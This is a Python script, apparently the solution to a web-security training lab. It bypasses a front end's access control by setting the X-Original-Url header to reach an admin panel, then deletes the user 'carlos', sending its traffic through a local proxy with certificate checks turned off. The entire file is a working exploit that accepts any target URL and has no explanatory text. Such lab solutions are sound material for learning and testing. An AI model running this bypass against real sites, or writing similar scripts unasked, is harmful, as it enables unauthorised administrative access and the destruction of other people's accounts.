import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def delete_user(url,s):
    print("(+) Trying to change header values for x-original-url...")
    headers = {
        'X-Original-Url' : '/admin'
    }
    req = s.get(url, headers=headers,proxies=proxies,verify=False)
    res = req.text
    if "carlos" in res:
        print("(+) Successfully got an admin panel page")
        print("(+) Deleting carlos user...")
        headers = {
            'X-Original-Url' : '/admin/delete'
        }
        carlos_url = url + '/?username=carlos'
        req = s.get(carlos_url,proxies=proxies,verify=False,headers=headers)
        if req.status_code==200:
            print("(+) Successfully deleted carlos user")
            print("(+) Lab Solved!")
        else:
            print("(+) Failure to delete carlos user!")
    else:
        print("(+) Failure to found carlos in admin page!")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0].split('/')[-1]} URL")
        print(f"Example: {sys.argv[0].split('/')[-1]} www.example.com")
        sys.exit(-1)
    
    print("(+) Finding admin panel...")
    url = sys.argv[1]
    s = requests.Session()
    delete_user(url, s)



if __name__ == '__main__':
    main()